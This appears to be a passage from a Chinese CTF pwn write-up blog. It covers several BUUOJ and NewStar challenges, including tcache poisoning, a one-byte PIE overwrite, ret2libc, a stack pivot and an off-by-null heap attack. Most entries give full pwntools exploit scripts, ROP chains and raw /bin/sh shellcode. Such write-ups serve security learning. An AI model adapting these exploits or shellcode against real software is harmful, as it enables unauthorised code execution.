title="再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权"></a>再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,)p=process(&quot;./SWPUCTF_2019_p1KkHeap&quot;)context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)def add(size):    p.sendlineafter(&#39;Your Choice: &#39;,&#39;1&#39;)    p.sendlineafter(&#39;size: &#39;,str(size))def show(index):    p.sendlineafter(&#39;Your Choice: &#39;,&#39;2&#39;)    p.sendlineafter(&#39;id: &#39;,str(index))def edit(index,content):    p.sendlineafter(&#39;Your Choice: &#39;,&#39;3&#39;)    p.sendlineafter(&#39;id: &#39;,str(index))    p.sendlineafter(&#39;content: &#39;,content)def dele(index):    p.sendlineafter(&#39;Your Choice: &#39;,&#39;4&#39;)    p.sendlineafter(&#39;id: &#39;,str(index))add(0x100)  #0add(0x100)  #1dele(1)dele(1)show(1)p.recvuntil(&#39;content: &#39;)tache_addr=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x360print(hex(tache_addr))add(0x100)  #2edit(2,p64(tache_addr)*2)add(0x100)  #3add(0x100)  #4vmmap=0x66660000edit(4,0xb8*&#39;\x00&#39;+p64(vmmap))add(0x100)  #5shellcode=shellcraft.open(&#39;flag&#39;,0)shellcode+=shellcraft.read(3,0x66660300,0x30)shellcode+=shellcraft.write(1,0x66660300,0x30)edit(5,asm(shellcode))dele(0)show(0)p.recvuntil(&#39;content: &#39;)malloc_hook=u64(p.recv(6).ljust(8,&#39;\x00&#39;))-0x70print(hex(malloc_hook))#dele(0)edit(4,0xb8*&#39;\x00&#39;+p64(malloc_hook))add(0x100)  #6edit(6,p64(vmmap))add(0x100)gdb.attach(p)sleep(1)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar</title>
      <link href="/2023/10/25/NewStar/"/>
      <url>/2023/10/25/NewStar/</url>
      
        <content type="html"><![CDATA[<h2 id="p1eee"><a href="#p1eee" class="headerlink" title="p1eee"></a>p1eee</h2><h5 id="开了pie保护"><a href="#开了pie保护" class="headerlink" title="开了pie保护"></a>开了pie保护</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3cV5.png" alt="image-20231025205617591"></p><h5 id="可以溢出一字节"><a href="#可以溢出一字节" class="headerlink" title="可以溢出一字节"></a>可以溢出一字节</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3gtX.png" alt="image-20231025210358978"></p><h5 id="还有个后门函数"><a href="#还有个后门函数" class="headerlink" title="还有个后门函数"></a>还有个后门函数</h5><p><img src="https://i0.imgs.ovh/2023/10/25/F3eks.png" alt="image-20231025210337922"></p><p>因为代码段和后门函数地址相差是非常近的，只差了一个字节，所以可以直接覆盖返回地址为后门函数地址，返回函数的地址一般都是move rbp ，rsp之类的，所以这里最后一字节改成’\x69’,改成之前的都不行。</p><p><img src="https://i0.imgs.ovh/2023/10/25/F3tNU.png" alt="image-20231025210604176"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node4.buuoj.cn&quot;,29807)#p=process(&quot;./pie&quot;)context.log_level=&quot;debug&quot;payload=&#39;a&#39;*(0x28)+&#39;\x69&#39;p.sendlineafter(&#39;A nice try to break pie!!!&#39;,payload)#gdb.attach(p)#sleep(1)#p.sendline(payload)p.interactive()</code></pre><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h5 id="常规的64位的ret2libc题"><a href="#常规的64位的ret2libc题" class="headerlink" title="常规的64位的ret2libc题"></a>常规的64位的ret2libc题</h5><p><img src="https://i0.imgs.ovh/2023/10/30/AAzet.png" alt="image-20231026223501750"></p><h5 id="区别在于最后的payload要在p64-binsh-后面加个ret的参数"><a href="#区别在于最后的payload要在p64-binsh-后面加个ret的参数" class="headerlink" title="区别在于最后的payload要在p64(binsh)后面加个ret的参数"></a>区别在于最后的payload要在p64(binsh)后面加个ret的参数</h5><pre><code class="lang-py">payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</code></pre><p><img src="https://i0.imgs.ovh/2023/10/30/AAUGm.png" alt="image-20231026223815671"></p><h5 id="libc的话write-up是推荐手动计算，但是没给具体是什么版本的libc-用题目本身的，用buu自带提供的libc-2-23-so-libc-2-27-so都是打不通的。"><a href="#libc的话write-up是推荐手动计算，但是没给具体是什么版本的libc-用题目本身的，用buu自带提供的libc-2-23-so-libc-2-27-so都是打不通的。" class="headerlink" title="libc的话write_up是推荐手动计算，但是没给具体是什么版本的libc,用题目本身的，用buu自带提供的libc-2.23.so,libc-2.27.so都是打不通的。"></a>libc的话write_up是推荐手动计算，但是没给具体是什么版本的libc,用题目本身的，用buu自带提供的libc-2.23.so,libc-2.27.so都是打不通的。</h5><pre><code class="lang-py"># libc.blukat.me 查询libc版本后手动计算（推荐）libc_base   =   puts_addr - 0x080970system_addr =   libc_base + 0x04f420bin_addr    =   libc_base + 0x1b3d88</code></pre><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import *from LibcSearcher import *p=remote(&quot;node4.buuoj.cn&quot;,27215)#p=process(&quot;./ret2libc1&quot;)elf=ELF(&#39;./ret2libc1&#39;)#libc=ELF(&#39;./libc-2.23.so&#39;)#libc=elf.libccontext.log_level=&quot;debug&quot;puts_plt=0x400520puts_got=elf.got[&#39;puts&#39;]pop_rdi=0x400763main=0x400698ret=0x4006F1payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter(&#39;again&#39;,payload)p.recvuntil(&#39;time&#39;)#gdb.attach(p)sleep(1)puts_addr=u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))#puts_addr=u64(p.recvuntil(&#39;\n&#39;,drop=True).ljust(8,&#39;\x00&#39;))print(hex(puts_addr))base=puts_addr-0x04f420#-libc.sym[&#39;puts&#39;]system=base+0x080970#libc.sym[&#39;system&#39;]binsh=base+0x1b3d88#libc.search(&#39;bin/sh&#39;).next()payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)p.sendlineafter(&#39;again&#39;,payload)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-NewSar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>login</title>
      <link href="/2023/10/23/login/"/>
      <url>/2023/10/23/login/</url>
      
        <content type="html"><![CDATA[<h5 id="例行检查，这道题是静态的，函数多且看不懂"><a href="#例行检查，这道题是静态的，函数多且看不懂" class="headerlink" title="例行检查，这道题是静态的，函数多且看不懂"></a>例行检查，这道题是静态的，函数多且看不懂</h5><p><img src="https://i.imgs.ovh/2023/10/23/2NN33.png" alt="image-20231023205047486"></p><h5 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.imgs.ovh/2023/10/23/2N9ae.png" alt="image-20231023204935533"></h5><h5 id="第十五行的Base64Decode函数，参数是s-用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。"><a href="#第十五行的Base64Decode函数，参数是s-用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。" class="headerlink" title="第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。"></a>第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。</h5><p><img src="https://i.imgs.ovh/2023/10/23/2aClH.png" alt="image-20231023205506057"></p><h5 id="看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send-可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。"><a href="#看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send-可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。" class="headerlink" title="看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。"></a>看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。</h5><p><img src="https://i.imgs.ovh/2023/10/23/2a21s.png" alt="image-20231023210859918"></p><p><img src="https://i0.imgs.ovh/2023/10/26/Fbv9I.png" alt="image-20231026202306583"></p><h5 id="payload这样写"><a href="#payload这样写" class="headerlink" title="payload这样写"></a>payload这样写</h5><pre><code class="lang-py">payload=&#39;aaaa&#39;+p32(0x8049284)+p32(0x811EB40)payload=base64.b64encode(payload)</code></pre><h5 id="只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64-b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4-v4的大小是八字节，会覆盖到ebp-ebp是input的地址0x811EB40-然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp-esp-4，也就是调用correct函数的地址，然后提权"><a href="#只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64-b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4-v4的大小是八字节，会覆盖到ebp-ebp是input的地址0x811EB40-然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp-esp-4，也就是调用correct函数的地址，然后提权" class="headerlink" title="只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp=esp+4，也就是调用correct函数的地址，然后提权"></a>只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp=esp+4，也就是调用correct函数的地址，然后提权</h5><p><img src="https://i0.imgs.ovh/2023/10/26/Fbacj.png" alt="image-20231026205553321"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoPSJ.png" alt="image-20231026204932010"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoCMV.png" alt="image-20231026205315054"></p><p><img src="https://i0.imgs.ovh/2023/10/26/FoVdW.png" alt="image-20231026205440817"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="lang-py">from pwn import*import base64from LibcSearcher import *p=remote(&quot;node4.buuoj.cn&quot;,29010)#p=process(&quot;./login&quot;)context.log_level=&quot;debug&quot;shell=0x08049284fake_addr=0x811eb40#payload=&#39;a&#39;*0x4+p32(shell)+p32(fake_addr)payload=base64.b64encode(payload)#gdb.attach(p)sleep(1)p.sendlineafter(&#39;Authenticate :&#39;,payload)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf_2019_easy_heap</title>
      <link href="/2023/10/21/sctf-2019-easy-heap/"/>
      <url>/2023/10/21/sctf-2019-easy-heap/</url>
      
        <content type="html"><![CDATA[<h4 id="这道题用off-by-null解"><a href="#这道题用off-by-null解" class="headerlink" title="这道题用off by null解"></a>这道题用off by null解</h4><h5 id="例行检查，保护全开-不能利用got表，只能用hook的地址"><a href="#例行检查，保护全开-不能利用got表，只能用hook的地址" class="headerlink" title="例行检查，保护全开,不能利用got表，只能用hook的地址"></a>例行检查，保护全开,不能利用got表，只能用hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/21/2tYAH.png" alt="image-20231021201805120"></p><h5 id="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"><a href="#程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。" class="headerlink" title="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"></a>程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。</h5><h5 id="mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："><a href="#mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：" class="headerlink" title="mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："></a>mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：</h5><ul><li>PROT_EXEC：允许对内存映射区域进行执行访问。</li><li>PROT_READ：允许对内存映射区域进行读取访问。</li><li>PROT_WRITE：允许对内存映射区域进行写入访问。</li><li>PROT_NONE：禁止对内存映射区域进行任何访问。</li></ul><h5 id="当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"><a href="#当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。" class="headerlink" title="当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"></a>当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。</h5><p><img src="https://i.imgs.ovh/2023/10/21/21wjI.png" alt="image-20231021203428599"></p><h5 id="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"><a href="#单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数" class="headerlink" title="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"></a>单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数</h5><p><img src="https://i.imgs.ovh/2023/10/21/21fLV.png" alt="image-20231021203536497"></p><h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><h5 id="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址"><a href="#按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址" class="headerlink" title="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址"></a>按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址</h5><pre><code class="lang-py">add(0x410)p.recvuntil(&#39;Address &#39;)chunk0_addr=int(p.recv(14),16)</code></pre><p><img src="https://i.imgs.ovh/2023/10/21/21ROU.png" alt="image-20231021212103375"></p><h5 id="然后再创建四个大小不同的堆"><a href="#然后再创建四个大小不同的堆" class="headerlink" title="然后再创建四个大小不同的堆"></a>然后再创建四个大小不同的堆</h5><pre><code class="lang-py">add(0x28)add(0x18)add(0x4f8)add(0x10)</code></pre><p><img src="https://i.imgs.ovh/2023/10/21/21glC.png" alt="image-20231021214117731"></p><h5 id="然后free掉堆0"><a href="#然后free掉堆0" class="headerlink" title="然后free掉堆0"></a>然后free掉堆0</h5><pre><code class="lang-py">dele(0)</code></pre><h5 id="然后edit堆2-也就是输入内容，构造下面的unlink"><a href="#然后edit堆2-也就是输入内容，构造下面的unlink" class="headerlink" title="然后edit堆2,也就是输入内容，构造下面的unlink"></a>然后edit堆2,也就是输入内容，构造下面的unlink</h5><pre><code class="lang-py">payload=p64(0)*2+p64(0x420+0x20+0x30)</code></pre><p><img src="https://i.imgs.ovh/2023/10/21/2JLl9.png" alt="image-20231021222737762"></p><h5 id="在free堆3后，就会unlink合并，四个堆合并在一起"><a href="#在free堆3后，就会unlink合并，四个堆合并在一起" class="headerlink" title="在free堆3后，就会unlink合并，四个堆合并在一起"></a>在free堆3后，就会unlink合并，四个堆合并在一起</h5><pre><code class="lang-py">dele(3) free堆3</code></pre><p><img src="https://i.imgs.ovh/2023/10/21/2JXbO.png" alt="image-20231021223134709"></p><h5 id="这里存堆0，堆3的指针都被清掉了。"><a href="#这里存堆0，堆3的指针都被清掉了。" class="headerlink" title="这里存堆0，堆3的指针都被清掉了。"></a>这里存堆0，堆3的指针都被清掉了。</h5><p><img src="https://i.imgs.ovh/2023/10/21/2Jr5H.png" alt="image-20231021223200332"></p><h5 id="再free堆1，堆2"><a href="#再free堆1，堆2" class="headerlink" title="再free堆1，堆2"></a>再free堆1，堆2</h5><p><img src="https://i.imgs.ovh/2023/10/21/2JFXD.png" alt="image-20231021223634211"></p><p><img src="https://i.imgs.ovh/2023/10/21/2JABo.png" alt="image-20231021223742057"></p><h5 id="然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。"><a href="#然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。" class="headerlink" title="然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。"></a>然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。</h5><pre><code class="lang-py">add(0x440)add(0x510)</code></pre><p><img src="https://i.imgs.ovh/2023/10/22/25gco.png" alt="image-20231022185742061"></p><p><img src="https://i.imgs.ovh/2023/10/22/25t9A.png" alt="image-20231022185800359"></p><p><img src="https://i.imgs.ovh/2023/10/22/25JH5.png" alt="image-20231022185836223"></p><h5 id="然后编辑这两个堆的内容"><a href="#然后编辑这两个堆的内容" class="headerlink" title="然后编辑这两个堆的内容"></a>然后编辑这两个堆的内容</h5><pre><code class="lang-py">payload=p64(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10)fill(0,payload)fill(1,&#39;\x30&#39;)</code></pre><h5 id="编辑完后，这是堆0的"><a href="#编辑完后，这是堆0的" class="headerlink" title="编辑完后，这是堆0的"></a>编辑完后，这是堆0的</h5><p><img src="https://i.imgs.ovh/2023/10/22/25UdX.png" alt="image-20231022190729493"></p><h5 id="成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。"><a href="#成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。" class="headerlink" title="成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。"></a>成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25j2U.png" alt="image-20231022190804852"></p><h5 id="这是堆1的，bin指针修改成了malloc-hook的地址。"><a href="#这是堆1的，bin指针修改成了malloc-hook的地址。" class="headerlink" title="这是堆1的，bin指针修改成了malloc_hook的地址。"></a>这是堆1的，bin指针修改成了malloc_hook的地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25yUK.png" alt="image-20231022191125950"></p><h5 id="原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址"><a href="#原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址" class="headerlink" title="原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址"></a>原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2YPP2.png" alt="image-20231022191235807"></p><h5 id="再malloc两次，把多余的freechunk拿掉"><a href="#再malloc两次，把多余的freechunk拿掉" class="headerlink" title="再malloc两次，把多余的freechunk拿掉"></a>再malloc两次，把多余的freechunk拿掉</h5><pre><code class="lang-py">add(0x28)#2add(0x18)#3</code></pre><p><img src="https://i.imgs.ovh/2023/10/22/2YV6j.png" alt="image-20231022191554689"></p><h5 id="再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧"><a href="#再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧" class="headerlink" title="再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧"></a>再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧</h5><pre><code class="lang-py">add(0x28)#5payload2 = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;fill(5,payload2 + &#39;\n&#39;)</code></pre><p><img src="https://i.imgs.ovh/2023/10/22/2YLeI.png" alt="image-20231022191845126"></p><h5 id="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。"><a href="#再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。" class="headerlink" title="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。"></a>再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。</h5><pre><code class="lang-py">add(0x18)#6edit(6,p64(st_addr + 0x10) + &#39;\n&#39;)</code></pre><p><img src="https://i.imgs.ovh/2023/10/22/2YXGV.png" alt="image-20231022192746832"></p><h5 id="这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址"><a href="#这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址" class="headerlink" title="这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址"></a>这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2Y2MJ.png" alt="image-20231022192836650"></p><h5 id="最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。"><a href="#最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。" class="headerlink" title="最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。"></a>最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*from LibcSearcher import *p=remote(&quot;node4.buuoj.cn&quot;,29573)#p=process(&quot;./sctf_2019_easy_heap&quot;)context(arch=&#39;amd64&#39;)context.log_level=&quot;debug&quot;libc=ELF(&#39;./libc-2.27.so&#39;)def add(size):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)    p.sendlineafter(&#39;Size: &#39;,str(size))def fill(index,content):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))    p.sendlineafter(&#39;Content: &#39;,content)def dele(index):    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)    p.sendlineafter(&#39;Index: &#39;,str(index))p.recvuntil(&#39;Mmap: &#39;)mmap_addr=int(p.recv(12),16)print(hex(mmap_addr))add(0x410) add(0x28)add(0x18)add(0x4f8)add(0x10)dele(0)payload=p64(0)*2+p64(0x420+0x20+0x30)fill(2,payload)dele(3)dele(1)dele(2)add(0x440)add(0x510)payload=&#39;a&#39;*(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10)fill(0,payload)fill(1,&#39;\x30&#39;)add(0x28)#2add(0x18)#3add(0x28)#5add(0x18)#6payload2 = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;fill(5,payload2)fill(6,p64(mmap_addr + 0x10))add(0x10)p.interactive()</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/16/gyctf_2020_some_thing_exceting/"/>
      <url>/2023/10/16/gyctf_2020_some_thing_exceting/</url>
      
        <content type="html"><![CDATA[<h1 id="gyctf-2020-some-thing-exceting"><a href="#gyctf-2020-some-thing-exceting" class="headerlink" title="gyctf_2020_some_thing_exceting"></a>gyctf_2020_some_thing_exceting</h1><h4 id="有点奇怪的UAF题，double-free-有点奇怪"><a href="#有点奇怪的UAF题，double-free-有点奇怪" class="headerlink" title="有点奇怪的UAF题，double free 有点奇怪"></a>有点奇怪的UAF题，double free 有点奇怪</h4><h4 id="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"><a href="#做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来" class="headerlink" title="做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来"></a>做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来</h4><p><img src="https://i.imgs.ovh/2023/10/16/rORK5.png" alt="image-20231016195506227"></p><h4 id="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"><a href="#flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8" class="headerlink" title="flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8"></a>flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOQlA.png" alt="image-20231016195328962"></p><h4 id="除了没有edit函数，其他都有"><a href="#除了没有edit函数，其他都有" class="headerlink" title="除了没有edit函数，其他都有"></a>除了没有edit函数，其他都有</h4><h4 id="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"><a href="#add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。" class="headerlink" title="add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。"></a>add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOuOD.png" alt="image-20231016194828854"></p><h4 id="show函数，将两个地址的内容都打印出来，后期是用来打印flag"><a href="#show函数，将两个地址的内容都打印出来，后期是用来打印flag" class="headerlink" title="show函数，将两个地址的内容都打印出来，后期是用来打印flag"></a>show函数，将两个地址的内容都打印出来，后期是用来打印flag</h4><p><img src="https://i.imgs.ovh/2023/10/16/rO7Eo.png" alt="image-20231016195158667"></p><h4 id="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free"><a href="#dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double-free" class="headerlink" title="dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free"></a>dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free</h4><p><img src="https://i.imgs.ovh/2023/10/16/rOt0U.png" alt="image-20231016195828924"></p><h4 id="漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次"><a href="#漏洞是利用double-free-先单独free同一个两次堆不行，得先创建两次" class="headerlink" title="漏洞是利用double free 